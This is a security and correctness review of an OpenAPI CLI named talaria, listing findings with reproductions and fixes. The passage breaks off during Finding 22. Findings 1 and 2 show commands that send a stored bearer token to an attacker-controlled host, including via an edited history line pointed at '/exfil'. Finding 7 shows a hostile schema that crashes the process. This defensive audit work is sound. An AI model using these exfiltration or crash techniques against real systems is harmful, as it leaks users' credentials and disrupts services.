# Review findings — `ralph/design` vs `main`

Reviewers run: security, spec-compliance, concurrency, integration (`.ralph/stack.json`).
Spec: `docs/design/DESIGN.md`. Conventions: `README.md`, `AGENT.md`,
`docs/research/2026-08-02-design-review.md`.

Build, `gofmt`, `go vet` and `go test -race ./...` are all clean at HEAD (15/15 packages).

This is the third review round. The 6 CRIT findings from the previous round were fixed in
`795fc18..383eb98`, each with a regression test. Three of those fixes were re-attacked and hold
(`64a3504` run cancellation, `94a68c3` curl orphaning, `e0cceae` history serialisation).
Finding 2 below is the unclosed half of the previous round's Finding 6.

27 findings: 8 CRIT, 16 WARN, 3 INFO.

## Finding 1: A resolved credential is sent to whatever host `--base-url` or the spec names
- **Reviewer:** security
- **Severity:** CRIT
- **File:** internal/request/build.go:134
- **Description:** `baseURL()` prefers `--base-url` over the profile's `base-url`, and `credentials()` (build.go:500) then attaches the profile's credentials to that destination unconditionally. Nothing anywhere compares the destination against the profile's own base-url, the spec's `servers[*]`, or an allowlist — so a single flag re-points a profile-pinned credential at any host. Reproduced with two listeners (19801 = the profile's pinned host, 19802 = attacker), profile `prod: {base-url: http://127.0.0.1:19801, auth: {bearerAuth: ${PROD_TOKEN}}}`:

  ```
  $ PROD_TOKEN=PROFILE-PINNED-TOKEN-777 talaria call spec.yaml getP \
        --profile prod --base-url http://127.0.0.1:19802
  ```
  Listener 19802 received `Authorization: Bearer PROFILE-PINNED-TOKEN-777`. The same works with no profile at all — a spec whose `servers[0].url` names the attacker's host is enough, and choosing the spec is the one thing the agent always controls (`talaria call /tmp/evil.yaml op` delivered `TALARIA_AUTH_BEARER` in cleartext to 19802). stdout still shows `<redacted:env:PROD_TOKEN>` throughout, so nothing about the run looks wrong. A profile is documented as one unit — "base-url + auth + headers" (README.md:174) — but only the `auth` half is binding. This defeats §1 ("an agent can explore, call, and test that API — **without ever being given your credentials**") and §3 principle 0, and it is not among the three threats §5a says are out of scope.
- **Suggested fix:** Resolve a credential only for a destination it is scoped to. (a) When a profile supplies the credential, refuse a host other than the profile's `base-url` host unless the profile opts in (`allow-hosts: [...]`). (b) Add an optional `allow-hosts` to the config file gating `TALARIA_AUTH_*` too, defaulting to the spec's `servers[*]` hosts. (c) Make the refusal exit 2 naming the refused host so an agent cannot mistake it for a network failure. Document the guarantee in AGENT.md.

## Finding 2: `history replay` still ships a credential to any host the store names
- **Reviewer:** security
- **Severity:** CRIT
- **File:** cmd/talaria/history.go:560
- **Description:** Commit `383eb98` added `replayableEnv` (history.go:721) so a stored `<redacted:env:NAME>` can only resolve a name inside the `TALARIA_AUTH_*` namespace or the profile's auth map. The *other* half of the previous round's Finding 6 — "and sends it to an arbitrary host" — is untouched: `replayRequest` validates the stored URL for userinfo and an http(s) scheme and nothing else, so the host comes straight off a line in `history.jsonl`. Reproduced by recording a normal call and appending one edited line to the store:

  ```
  $ talaria call spec.yaml getP                     # records entry, host 19801
  $ python3 -c '...'   # copy the line, set "url":"http://127.0.0.1:19802/exfil", "id":"EVIL"
  $ TALARIA_AUTH_BEARER=CANARY-SECRET-abc123 talaria history replay EVIL
  ```
  Listener 19802 received `Authorization: Bearer CANARY-SECRET-abc123`. The capability required is write access to `~/.local/state/talaria/history.jsonl` (0600, same-user) — exactly the deployment §5a names as the one that "fully realises the boundary": the agent has no credential in its own environment but can drive the binary and write its state directory. The code comment at history.go:712-720 says the goal is to stop talaria being a "read `$ANY_VAR` and send it to `$ANY_URL` primitive"; it is still a "read the auth namespace and send it to `$ANY_URL`" primitive. AGENT.md:248-251 documents only the name restriction, which reads as if the hole is closed.
- **Suggested fix:** Apply the same destination gate as Finding 1 at history.go:560 — refuse to resolve a credential for a replay whose host is not in the allowed set. Failing that, drop every credential-bearing field when the replay host differs from the host recorded alongside the credential, and say so on stderr rather than resolving silently.

## Finding 3: `run` ignores parameter- and media-type-level `example`/`examples`, breaking the documented test-data priority order
- **Reviewer:** spec-compliance, integration
- **Severity:** CRIT
- **File:** internal/operation/extract.go:166
- **Description:** DESIGN.md §5a "Test data for `run` mode": *"Priority order: spec `example`/`examples` → user fixture files → schema-generated data (`gen`). Examples-first keeps requests realistic."* `extract.go:166` copies only `media.Schema` off each `MediaType`, dropping `media.Example`/`media.Examples`, and `operation.Param` (operation.go:49-60) carries no example field at all. So `exampleValue` (internal/gen/gen.go:323, consumed at fixtures.go:176 and :206) can only ever find `schema.example` — the least common of the four places an author writes an example. The OpenAPI-canonical locations never leave the spec loader.

  Reproduced with a spec placing an example at each of the four levels; observed wire from `run --allow-mutations`:
  ```
  GET  /a/860              <- parameter-level `example: 1234`                 IGNORED
  GET  /b/5678             <- schema-level `example: 5678`                    used
  POST /c {}               <- mediaType `example: {k: FROM_MEDIA_EXAMPLE}`    IGNORED
  POST /d {"k":"delta-568"} <- mediaType `examples: {one: {value: …}}`        IGNORED
  POST /e {"k":"FROM_SCHEMA_EXAMPLE"} <- schema-level example                 used
  ```
  Moving an example onto the schema makes it work, confirming the omission is the *location*, not the mechanism. The practical effect is that `run` fires invented ids and empty bodies at real APIs for the majority of specs — exactly the "schema-valid noise" the priority order exists to avoid. Both agent-facing docs assert the working behaviour (AGENT.md:121, README.md:448), so an agent trusts data that was never used. `describe` never surfaces those examples either.
- **Suggested fix:** Add `Example any` / `Examples map[string]any` to `operation.MediaType` and `operation.Param`, populate them in `extractContent`/`extractParams` from libopenapi's `Parameter.Example`/`Parameter.Examples` and `MediaType.Example`/`MediaType.Examples`, and consult them in `gen.paramValue` (fixtures.go:172) and `gen.bodyFor` (:200) *before* falling through to `exampleValue(schema)`. Order within the tier: parameter/media-type `example` → first `examples` entry's `value` → schema `example`/`examples`.

## Finding 4: An OAuth2 scheme makes every operation uncallable while `auth check` exits 0 reporting nothing is needed
- **Reviewer:** spec-compliance
- **Severity:** CRIT
- **File:** internal/config/auth.go:225
- **Description:** DESIGN.md §5 Auth: *"v1 scope: bearer, basic, API key (header/query/cookie). OAuth flows out of scope (**bring your own token**)."* The code comment at auth.go:223-224 repeats this — *"the caller is expected to bring a token for them"* — but there is no mechanism to bring one. `schemeReason` refuses any `type: oauth2` outright, and `credentialFor` (:288) is only reached by schemes that already passed it, so neither `--header`, nor a profile `auth:` entry, nor a profile `headers:` entry gets past the gate. Worse, `Schemes` (auth.go:179) filters out every scheme `schemeReason` rejects, so `auth check` reports an empty list and **exits 0** on a spec where nothing is callable:

  ```
  $ talaria auth check oauth.yaml --output json
  {"schema":"talaria/v1","schemes":[]}                                        exit=0
  $ talaria call oauth.yaml listPets --dry-run
  {"error":{"code":2,"message":"…scheme petstore_auth is of unsupported type oauth2"}}  exit=2
  $ talaria call oauth.yaml listPets --header "Authorization=Bearer tok" --dry-run   # same exit 2
  $ TOK=abc talaria call oauth.yaml listPets --profile p --dry-run                   # same exit 2
  $ talaria run oauth.yaml --report json --fail-on-error
  {"summary":{"total":1,"passed":0,"failed":0,"skipped":1}}                   exit=0
  ```
  This is the shape of the previous round's Finding 3 left open for the OAuth2 case: `auth check` says green, the call exits 2, and CI with `--fail-on-error` exits 0 having tested nothing. It is not a corner case — the canonical Swagger petstore, GitHub and most OAuth-fronted APIs declare `type: oauth2`, against §1's promise of "any API's OpenAPI/Swagger doc". The exit code is also wrong per §4: this is a missing credential (5, *"so agents can act on it: ask the human to set `$NAME`"*), reported as a usage error (2) with no variable name to give the human.
- **Suggested fix:** Treat `oauth2` and `openIdConnect` as bearer-shaped: map them to `TALARIA_AUTH_BEARER` (or `TALARIA_AUTH_OAUTH_<SCHEME>`) in `credentialFor`, remove them from `schemeReason`'s refusal, and let the existing missing-credential path produce exit 5 naming the variable. At minimum, have `Schemes` report unsupported schemes with `"present": false` and a `reason` so `auth check` cannot exit 0 on a spec no operation can call.

## Finding 5: Server variables in `servers[].url` are never substituted, dead-ending a whole class of real 3.x specs
- **Reviewer:** integration
- **Severity:** CRIT
- **File:** internal/request/build.go:158
- **Description:** OpenAPI 3.x server templating (`{scheme}://host:{port}/base` with `variables:` defaults) is standard and common. `baseURL()` parses the raw string and rejects anything non-absolute; nothing expands the declared defaults. The documented loop discovers operations fine and then cannot call any of them:

  ```
  $ talaria list ./srv.yaml --output tsv        # servers[0].url: "{scheme}://127.0.0.1:{port}/base"
  GET	/pets	listPets                          # variables: scheme{default: http}, port{default: "9977"}
  $ talaria call ./srv.yaml listPets --dry-run
  {"error":{"code":2,"message":"cannot build a request for listPets: base URL
   \"{scheme}://127.0.0.1:{port}/base\" from the spec's servers[0].url is not an absolute http(s) URL"}}
  rc=2
  ```
  The same path also contradicts its own doc comment (build.go:132-133: *"A spec whose server URL is relative … counts as no server"*). It does not — `servers: [{url: /v1}]` hard-fails with the same message instead of falling through to the helpful `"no base URL: the spec declares no server, so pass --base-url or set one in a profile"`, which only fires when `servers` is absent entirely. Neither AGENT.md nor README mentions server variables, so an agent hitting this has no next step. (Swagger 2.0 `basePath` is handled correctly.)
- **Suggested fix:** Expand `Server.Variables` defaults in `firstServer` (libopenapi exposes them on `v3high.Server`) before the absoluteness check; a variable with no default and no override stays an error. Separately, make the relative-URL case fall through to the `no base URL … pass --base-url` message the comment promises, and name server variables in AGENT.md's `--base-url` bullet.

## Finding 6: `--output tsv` is not structurally sound — spec text forges rows and field counts vary
- **Reviewer:** integration, security
- **Severity:** CRIT
- **File:** internal/output/render.go:108
- **Description:** `tsvRenderer.Render` joins cells with `\t` and rows with `\n` and escapes nothing. Since the spec is untrusted input (§1), an operation's `summary` containing a tab or newline — YAML block scalars are routine — manufactures rows no operation backs. `cmd/talaria/list.go:103` passes `op.Summary` raw; two operations produce five lines with 5/1/4/1/0 fields:

  ```
  $ talaria list ./tabs.yaml --output tsv | awk -F'\t' '{print NR": "NF" fields"}'
  1: 5 fields
  2: 1 fields
  3: 4 fields
  4: 1 fields
  ```
  With a crafted summary the forgery is exact — `"harmless\nGET\t/admin\tdeleteEverything\tfully documented"` lists one operation as two, and `deleteEverything` is a well-formed row in the format §3.1 offers for machine consumption. An agent doing the documented `list --output tsv | cut -f3` to feed `describe`/`call` silently gets a wrong operationId. `search` already fixes this via `collapse()`, so the inconsistency is visible within the codebase. Separately, `cmd/talaria/run.go:590` appends a deterministic single-cell summary row to the same table, so `run --report tsv` *always* ends with a 1-field row among 6-field rows. The same forged line appears in `--output pretty` (render.go:129).
- **Suggested fix:** Sanitise in the renderers, not per producer — in `tsvRenderer.Render` and `prettyRenderer.Render`, replace `\t`, `\r` and `\n` in every cell before joining, so no present or future caller can break the format. That is the same argument the JUnit renderer already makes about letting the encoder escape (junit.go:62-66). Drop the summary row from the TSV rendering (keep it for pretty) or pad it to the row width.

## Finding 7: A hostile spec's `minLength`/`minItems` kills the process with a Go runtime OOM, exit 2 and no envelope
- **Reviewer:** security
- **Severity:** CRIT
- **File:** internal/gen/gen.go:178
- **Description:** `array()` sets `count` from `s.MinItems` with no upper bound and immediately does `make([]any, 0, count)` (gen.go:187); `clampLength()` does `strings.Repeat("x", int(*schema.MinLength)-len(s))` (gen.go:314) with no bound either. Both values come from the spec, which §1 says is untrusted. `talaria run` generates a body for every operation, so one pathological schema anywhere takes the process down — and not through `clierr`: a Go runtime OOM is a `fatal error`, so stderr gets a goroutine dump instead of the `talaria/v1` envelope §3.1 requires, and the process exits **2**, which §4 defines as "usage error — the agent should fix its invocation". An agent branching on the exit code retries the same command forever.

  ```
  # schema: {"big": {"type": "string", "minLength": 600000000}}
  $ ( ulimit -v 2000000; talaria run dos.json --allow-mutations --report json )
  runtime: out of memory: cannot allocate 603979776-byte block
  fatal error: out of memory            exit=2
  # schema: {"big": {"type": "array", "minItems": 200000000, "items": {"type":"integer"}}}
  $ ( ulimit -v 2000000; talaria run dos2.json --allow-mutations --report json )
  fatal error: out of memory            exit=2
  ```
  (`ulimit` only makes the failure fast; without it the process allocates until the machine runs out. For contrast, a self-referential `$ref` and a YAML alias bomb are both already caught as exit 3 with a proper envelope — this is the gap.)
- **Suggested fix:** Cap generated sizes in `internal/gen`: a `maxGeneratedItems` (~100) and `maxGeneratedLength` (~64 KiB), clamping `MinItems`/`MinLength` and skipping the field when the schema's minimum exceeds the cap (`return nil, false`, which `run` already reports as a skip with a reason). Guard the `int()` conversions too — on a 32-bit build `int(*MinLength)` can go negative and `strings.Repeat` panics.

## Finding 8: Every history append rewrites the whole store under the cross-process lock, costing seconds and gigabytes per call
- **Reviewer:** concurrency
- **Severity:** CRIT
- **File:** internal/corpus/store.go:99
- **Description:** `Append` takes the exclusive flock at :109 and then, inside that critical section, reads and JSON-parses the entire store twice (`uniqueID`→`storedIDs`'s `os.ReadFile` at :161, then `trim`'s at :250), builds a third full copy in `kept bytes.Buffer` (:278) and writes a fourth through `replace` (:293). The retention design guarantees the worst case is the steady state: `maxPerSource = 1000` × 3 sources × two `MaxBody = 64 KiB` bodies ≈ 394 MB, and once a source is *at* the cap every subsequent append is over it, so the full-file rewrite happens on every call, forever. Measured (1000 entries, local zero-latency server):

  | body size | store | wall per `call` | peak RSS |
  |---|---|---|---|
  | empty | 0 | 0.05 s | 19 MB |
  | 4 KB | 4.3 MB | 0.19 s | 36 MB |
  | 16 KB | 16.6 MB | 0.33 s | 82 MB |
  | 64 KB | 65.7 MB | 1.02 s | 253 MB |

  At the design's own maximum, `run` over 10 operations against 127.0.0.1 with no latency takes 55 s at 1.97 GB RSS, versus 0.22 s at 19 MB with history off. Three harms: (a) a 250x slowdown on the command an agent runs in a loop; (b) ~2 GB RSS is an OOM kill on a CI runner, and the kill lands mid-`trim` (Finding 22); (c) because it is all inside the flock it is cross-process starvation — a second talaria started during a `run` took **9.1 s** for one zero-latency call, and SIGINT sent during that wait was ignored for 4+ s and had no effect, since nothing on the `corpus` path consults a context.
- **Suggested fix:** Stop making every append a whole-file rewrite. (i) Derive the id without reading the store — timestamp plus random suffix, or an in-memory `lastID` — so `storedIDs` disappears. (ii) Amortise `trim`: rewrite only when a source is over cap by some slack (e.g. 10%), so the steady state is an O(1) append. (iii) Stream the rewrite line-by-line (`bufio.Scanner` old file → temp file) instead of `ReadFile` + `bytes.Buffer`, bounding peak memory by the largest entry. (iv) Pass the command's context into `Append` and abandon a wait/rewrite when it is done.

## Finding 9: SIGINT and SIGTERM are swallowed for the process lifetime, and the curl version preflight is unbounded
- **Reviewer:** concurrency
- **Severity:** WARN
- **File:** cmd/talaria/root.go:207
- **Description:** Previously reported as two separate WARNs; neither is fixed, and together they produce a process no catchable signal can end. `signal.NotifyContext` diverts both signals into a context and never re-raises — `stop()` runs only when `run` returns — so a second Ctrl-C does nothing. `preflight` (internal/curl/version.go:42) runs `exec.Command(path, "--version").Output()` with no context, no `WaitDelay` and no `Setpgid`, and it runs at exec.go:62 *before* `execCtx` is built at exec.go:82, so neither `--timeout` nor the signal context reaches it. With a `curl` that wedges on `--version` (a shell wrapper, a binary on a stalled NFS/autofs mount), only `kill -9` ends the process — the one signal that defeats every deferred cleanup this branch added, stranding a capture directory in TMPDIR for 24 h, and orphaning the preflight's child. The far more reachable instance needs no unusual curl: a spec URL that does not answer (`internal/spec/source.go:117`, bounded but uninterruptible) ignores two Ctrl-Cs and a `kill` for 30 s. Kept at WARN because the unbounded case requires a pathological `curl`; the routinely-reachable case is bounded at 30 s.
- **Suggested fix:** Replace `signal.NotifyContext` with an explicit `signal.Notify` handler that cancels the context on the first signal then calls `signal.Stop`, so a second signal restores default disposition and kills the process. Separately thread a context into `preflight` (`preflight(ctx, path)`) wrapped in `context.WithTimeout(ctx, 5*time.Second)` with `cmd.WaitDelay = time.Second` and `isolate(cmd)`.

## Finding 10: A credential in a path parameter is never redacted — cleartext on stdout, in the emitted curl, and in history
- **Reviewer:** security
- **Severity:** WARN
- **File:** internal/request/build.go:225
- **Description:** `hide()` (build.go:360) marks any value under a §5a credential-shaped name as sensitive, but it is applied only to `req.Query`, `req.Headers` and `req.Cookies` (build.go:85-87). Path parameters are substituted by `b.path()` and never become a `Pair`, so the name-based matcher never sees them. The comment at build.go:19 asserts "`path` is the one place a credential never goes", which is not true of real APIs — Telegram's Bot API is `/bot{token}/sendMessage`. Reproduced with `/bot{api_key}/getMe` (`api_key` matches the built-in `*api*key*` glob):

  ```
  $ talaria call path.yaml getMe --param api_key=CANARY-PATH-9999 --output json
  {"request":{"curl":"curl -q -s 'http://127.0.0.1:19801/botCANARY-PATH-9999/getMe'",
              "url":"http://127.0.0.1:19801/botCANARY-PATH-9999/getMe"},...}
  $ cat ~/.local/state/talaria/history.jsonl
  {..."url":"http://127.0.0.1:19801/botCANARY-PATH-9999/getMe",...}
  ```
  The same value as `--query api_key=…` renders `<redacted>` on every one of those surfaces. §5a calls history "a permanent artifact — the highest-risk surface in the tool", and this writes a credential-named value into it in cleartext. The canary suite does not cover the path location, so nothing catches it.
- **Suggested fix:** Run bound path-parameter values through `red.IsSensitive(p.Name)` in `b.path()`; on a match keep the wire form but record a redacted display form that `curl.URL`, `callPayload` and `corpus.NewEntry` render — mirroring how `QueryString` already takes a `Render`. Add a canary case for `in: path`.

## Finding 11: `run --fail-on-error` exits 0 on a suite where every operation was skipped
- **Reviewer:** spec-compliance
- **Severity:** WARN
- **File:** cmd/talaria/run.go:450
- **Description:** DESIGN.md §7 Phase 4 calls `run` "CI-ready", and README.md:444 / AGENT.md:122 both state the principle: *"A filter that matches nothing exits **2** rather than passing with nothing tested."* `verdict` consults only `view.Summary.Failed`, so a suite in which every operation was skipped is indistinguishable from one that passed:

  ```
  $ talaria run mut.yaml --report json --fail-on-error    # spec is one DELETE + one POST
  {"summary":{"total":2,"passed":0,"failed":0,"skipped":2}}   exit=0
  $ talaria run mut.yaml --tag nosuch --report json          # filter matches nothing
  {"error":{"code":2,"message":"no operation matches --tag \"nosuch\""}}   exit=2
  ```
  A mutation-heavy spec run in CI without `--allow-mutations`, or (per Finding 4) any spec talaria cannot authenticate, goes green having sent zero requests. Both cases are the same condition — nothing was tested — reported two different ways.
- **Suggested fix:** In `verdict`, when `failOnError` is set and `Summary.Passed == 0 && Summary.Failed == 0 && Summary.Skipped > 0`, exit nonzero naming the skip reasons; or add an explicit `--fail-on-skip`. Document whichever is chosen in AGENT.md's "A skip is not a failure" paragraph, which currently states the opposite.

## Finding 12: Emitted curl for an inline sensitive header silently reproduces a *different* request
- **Reviewer:** integration
- **Severity:** WARN
- **File:** internal/curl/render.go:224
- **Description:** DESIGN.md §3.4 makes `request.curl` "a portable reproduction". For a credential resolved from a `SecretRef` the rendering is correctly symbolic and byte-identical on replay (verified for bearer, basic, apiKey header/query/cookie across every method, `@file`, stdin, form and text bodies). But a value the caller supplied inline on a sensitive-named header renders the literal string `<redacted>`, and `word.credential` marks it inert, so the emitted command runs happily and sends different bytes:

  ```
  $ talaria call ./repro2.yaml headOp --header 'Cookie=a=1; b=2'
  → talaria on the wire:       Cookie: a=1; b=2
  → emitted request.curl:      curl -q -s -I -H 'Cookie: <redacted>' 'http://127.0.0.1:9977/h'
  → that command on the wire:  Cookie: <redacted>        (exit 0, 200 OK)
  ```
  Same for `--header X-Api-Key=…`, `Authorization=…`, `X-Request-Token=…`. AGENT.md:180 says these are "not copy-pasteable", but the failure mode is a request that *succeeds* with wrong data rather than one that visibly refuses — an agent pasting this into a bug report hands someone a reproduction that does not reproduce.
- **Suggested fix:** Render inline redactions as an obviously-unrunnable placeholder the shell rejects, or prefix the command with `# request carries N redacted value(s); substitute before running`, and add `request.curl_complete: false` to the JSON so a consumer can branch.

## Finding 13: A spec's credential header name is not held to the HTTP field-name charset
- **Reviewer:** security
- **Severity:** WARN
- **File:** internal/request/build.go:500
- **Description:** Every other route into `req.Headers` validates the name: spec header parameters via `isFieldName` (build.go:288), `--header` via `httpFieldName` (build.go:309), profile headers via `isFieldName` (build.go:333). `credentials()` alone appends `Pair{Name: cred.Name, ...}` with `cred.Name` taken verbatim from `components.securitySchemes.<x>.name`, which is spec-controlled. `checkSplit` catches CR/LF (the previous round's Finding 1 fix), but nothing else. Reproduced with `{"type":"apiKey","in":"header","name":"X-A: v"}`:

  ```
  $ TALARIA_AUTH_APIKEY_K=KEYVAL123 talaria call hdr2.json opH --output json
  {"request":{"curl":"curl -q -s -H \"X-A: v: $TALARIA_AUTH_APIKEY_K\" ...
  ```
  and on the wire, `X-A: v: KEYVAL123` — the credential leaves under a header name and value the operator never wrote, and the emitted curl reproduces it. (CR/LF in the same field is correctly refused with exit 2, so this is malformed-header rather than request splitting.)
- **Suggested fix:** In `credentials()`, reject a header-located credential whose `cred.Name` fails `isFieldName`, with the wording build.go:289 already uses. Do the analogous check for the cookie location — a `;` in a cookie name splits the joined `Cookie` directive built at config.go:257.

## Finding 14: JUnit and JSON reports show 0 ms for any operation that timed out or failed to connect
- **Reviewer:** integration
- **Severity:** WARN
- **File:** cmd/talaria/run.go:415
- **Description:** `res.TimingMS` is assigned only on the success path; when `ExecuteWith` returns an error the result goes straight to `res.fail(...)` with `TimingMS == nil`, and `runResult.seconds()` (run.go:626) turns that into `0`. A `--timeout 3` operation that consumed the full three seconds is reported as instant, and `<testsuite time>` — which sums the cases — is wrong for the whole suite:

  ```
  $ time talaria run ./api30.yaml --operation getSlow --timeout 3 --report junit
  <testsuite name="talaria run" tests="1" failures="1" time="0.000">
    <testcase name="getSlow" time="0.000">
      <failure message="…curl: (28) Operation timed out after 3002 milliseconds…"></failure>
  real	0m3.067s
  ```
  A CI dashboard tracking suite duration shows a wedged endpoint as free. The `seconds()` doc comment justifies 0 for "an operation that never reached a server" — correct for a skip, wrong for a timeout.
- **Suggested fix:** Time the `curl.ExecuteWith` call in `runner.execute` and set `res.TimingMS` before the `execErr` branch. Leave it nil only for genuine skips.

## Finding 15: Warnings on stderr are plain text, breaking the documented "stderr is JSON" contract
- **Reviewer:** integration
- **Severity:** WARN
- **File:** internal/secret/response.go:260
- **Description:** AGENT.md:206 tells the agent *"Errors go to **stderr** as one line of JSON in the same envelope"*, and AGENT.md:194 tells it to *"Report the warning"* from a query-string credential. Both land on the same stream unenveloped, so `jq` on stderr fails whenever they coincide:

  ```
  $ talaria call ./api30auth.yaml queryKeyedOp --base-url http://127.0.0.1:1 2>err.txt
  $ cat err.txt
  warning: this operation sends $TALARIA_AUTH_APIKEY_QKEY in the query parameter "api_key"; …
  {"schema":"talaria/v1","error":{"code":1,"message":"the request could not be completed: …"}}
  $ jq . < err.txt
  jq: parse error: Invalid numeric literal at line 1, column 8
  ```
  Same pattern at cmd/talaria/call.go:264 ("the call was not recorded in history") and call.go:407 ("the response was not validated").
- **Suggested fix:** Emit warnings in the envelope too — `{"schema":"talaria/v1","warning":{"code":"query_credential","message":"…"}}` — one JSON object per line, and update AGENT.md to say stderr is JSON *lines*, not one line.

## Finding 16: `valid_alternatives` is capped at 5, but AGENT.md tells the agent it is the complete set
- **Reviewer:** integration
- **Severity:** WARN
- **File:** internal/operation/index.go:16
- **Description:** AGENT.md:212: *"When `valid_alternatives` is present it is the complete set of right answers. Pick from it rather than guessing again."* `maxAlternatives = 5` truncates it, so an agent following the instruction literally can never reach an operation outside the top five, having been told not to guess again:

  ```
  $ talaria list ./api30.yaml --output tsv | wc -l
  9
  $ talaria describe ./api30.yaml nope 2>&1 >/dev/null | jq -c '.error.valid_alternatives'
  ["getPet","listPets","patchPet","createPet","deletePet"]
  ```
  `replacePet`, `getBadShape`, `getMissing` and `getSlow` are unreachable from this error. The cap itself is defensible (§3.1's context-dump argument) — the doc is what is wrong, and there is no signal in the payload that the list was truncated.
- **Suggested fix:** Add a `"truncated": true` / `"total_alternatives": 9` sibling field and reword AGENT.md to "the closest matches, not necessarily the whole set — run `list` if none fit"; or emit the complete set when the spec has few enough operations.

## Finding 17: `call --output pretty` — the TTY default — never shows the response body
- **Reviewer:** integration
- **Severity:** WARN
- **File:** cmd/talaria/call.go:475
- **Description:** DESIGN.md §3.1 locks the default to pretty-on-TTY, so this is what a human sees by default. The pretty table is request line, curl, status line, validation line — response body and headers are excluded. The inline comment justifies dropping *headers* (`Set-Cookie` in scrollback); nothing justifies dropping the body, which is the reason the call was made:

  ```
  $ script -qec "talaria call /tmp/tal/api30.yaml getPet --param petId=1" /dev/null
  GET http://127.0.0.1:9977/pets/1
  curl -q -s 'http://127.0.0.1:9977/pets/1'
  200 OK in 1ms
  validation: ok
  ```
  The server returned `{"id": 42, "name": "Fido", "tag": "dog"}`; a human must re-run with `--output json` to see it.
- **Suggested fix:** Append the redacted response body to the pretty rows — it already goes through `redactResponse`, and `history show --output pretty` prints exactly this. Truncate at a line budget with a `… (--output json for the rest)` marker if length is the concern.

## Finding 18: The §5a canary gate has no case for a validation-error path — the one error path the doc names explicitly
- **Reviewer:** spec-compliance
- **Severity:** WARN
- **File:** internal/canary/canary_test.go:427
- **Description:** DESIGN.md §5a leak-channel table: *"Error paths (curl stderr, **validation errors quoting the request**) | Errors are built from the redacted representation, never the raw one. **Test explicitly — error paths are where redaction bugs live**"*, and the suite *"gates every release thereafter."* `TestErrorPathsDoNotLeakTheCredential` covers seven stages and opens with a stale exemption: *"A response-validation failure is not here because response validation is not built yet (plan tasks 26 and 27). Whoever adds --fail-on-error adds the case."* Phase 3 and `--fail-on-error` shipped on this branch, and the case was never added — so the exit-4 envelope, `validation.errors[].message` (which embeds the request path), and the JUnit `<failure message=…>` built from it are all outside the gate. Probed by hand (query API key `CANARY_abcdef123456`, response violating the declared schema, `call --fail-on-error`): **no leak** in stdout, stderr or the history store. An unguarded surface rather than a live leak — but the one the doc singles out.
- **Suggested fix:** Delete the comment and add two stages: a `call --fail-on-error` whose response violates the schema (exit 4), and the same through `run --report junit --fail-on-error`, both with a query-string API-key canary so the validation message's URL is in scope.

## Finding 19: No canary mechanism drives a profile-supplied credential, the second of the two auth sources §5 defines
- **Reviewer:** spec-compliance
- **Severity:** WARN
- **File:** internal/canary/canary_test.go:99
- **Description:** DESIGN.md §5a: *"A CI suite injects canary secrets through **every auth mechanism**…"* §5 Auth defines two sources: env vars by convention, and *"Profiles (`~/.config/talaria/config.yaml`, mode 0600)… Secrets in profiles may reference env vars."* The `mechanisms` table covers five env-var paths (bearer, basic, apikey header/query/cookie) and nothing else. The only profile case in the suite is `TestACredentialResolutionFailureNamesNoValue` (:650), which asserts a *literal* profile entry is refused — the supported `${VAR}` form (`profileRef`, internal/config/auth.go:348) is never driven through the format × surface matrix. That path is a distinct resolution branch: it overrides the convention name (`credentialFor`, :302-307) and feeds `history replay`'s allow-list via `ReferencesEnv` (:328). Run by hand across json/pretty/tsv/junit plus the history store with `MY_TOKEN=PROFCANARY_…`: no leak. A gate hole, not a live leak.
- **Suggested fix:** Add a sixth `mechanism` whose harness writes a 0600 profile with `auth: {bearerAuth: ${CANARY_TOKEN}}` and sets `CANARY_TOKEN`, so it is exercised by `TestNoAuthMechanismLeaksIntoAnyOutputSurface` and `TestNoReportFormatLeaksTheCredential` like the others.

## Finding 20: Swagger 2.0 "conversion fidelity against real 2.0 specs" is verified only against 3-operation miniatures
- **Reviewer:** spec-compliance
- **Severity:** WARN
- **File:** internal/spec/convert_test.go:87
- **Description:** DESIGN.md §5: *"much of the real world is still 2.0… **Phase 1 must verify conversion fidelity against real 2.0 specs.**"* The suite has six conversion tests over three fixtures of 3 operations each, covering only path/query params, `host`+`basePath`+`schemes`, `securityDefinitions` for apiKey/basic, and `#/definitions` refs. The 2.0 constructs `openapi2conv` actually handles imperfectly are untested: `in: formData` (incl. `type: file`), `in: body`, `collectionFormat`, global `consumes`/`produces`, response `headers`, and `securityDefinitions` of `type: oauth2`. Probing a hand-built 2.0 spec exercising those:

  ```
  $ talaria describe sw2.json uploadFile --output json
  …"request_body":{"required":false,"content":[{"content_type":"multipart/form-data",
     "schema":{…"properties":[{"name":"file","type":"string","required":true},…
  ```
  Both formData params are `required: true` in the source, yet the converted `requestBody.required` is `false`, and `type: file` lands as a bare `string` with no `format: binary` — so `run`'s mutation gate and generator see a body the API will reject. These are conversion artifacts rather than talaria bugs, which is precisely why the doc asks them to be *verified* in Phase 1 rather than assumed.
- **Suggested fix:** Add one adversarial 2.0 fixture carrying formData (incl. `type: file`), a `body` parameter, `collectionFormat: multi`, global `consumes`/`produces`, response `headers` and an oauth2 `securityDefinition`, with assertions pinning what survives — the same shape as `strict-3.0.yaml` pins libopenapi-validator's 3.0 behaviour. Where a construct provably does not survive, say so in README's Swagger 2.0 paragraph rather than leaving it silent.

## Finding 21: The history store is never fsynced, so a crash can lose the whole file rather than one entry
- **Reviewer:** concurrency
- **Severity:** WARN
- **File:** internal/corpus/store.go:298
- **Description:** There is no `Sync()` anywhere in the package. `replace` writes the trimmed store to a temp file, `Close`s it, and `os.Rename`s it over the real one at :323 without fsyncing either the temp file or the containing directory. `os.Rename` is atomic with respect to *readers*, not to *writeback*: on ext4 `data=ordered` the rename metadata can reach disk while the temp file's data has not, so a power loss or kernel panic in that window leaves `history.jsonl` truncated or zero-filled — up to 3000 entries gone, where an append-only design loses at most the last line. The doc comment at :297 states the opposite guarantee ("a crash mid-trim leaves the old file intact"), true for the rename but not for the data behind it.
- **Suggested fix:** `tmp.Sync()` before `tmp.Close()` in `replace`, and fsync the directory after `os.Rename`. In `write` (store.go:213), `f.Sync()` before `f.Close()` so an acknowledged append is durable, since `Append` returning nil is documented at :94-95 to mean "the entry is in the store".

## Finding 22: A kill during `trim` leaks a full-store-sized temp file that nothing ever removes
- **Reviewer:** concurrency
- **Severity:** WARN
- **File:** internal/corpus/store.go:301
- **Description:** `replace` stages the rewrite as `.history-*` in the state directory and relies on `defer os.Remove(tmp.Name())` (:307), which only runs in-process. `curl.SweepStale` (internal/curl/sweep.go:40) is the only cleanup talaria has and it scans TMPDIR for `talaria-call-`/`talaria-body-` prefixes only — it never looks at the state directory. Reproduced by SIGKILLing a `call` 5.3 s into an append against a 394 MB store:

  ```
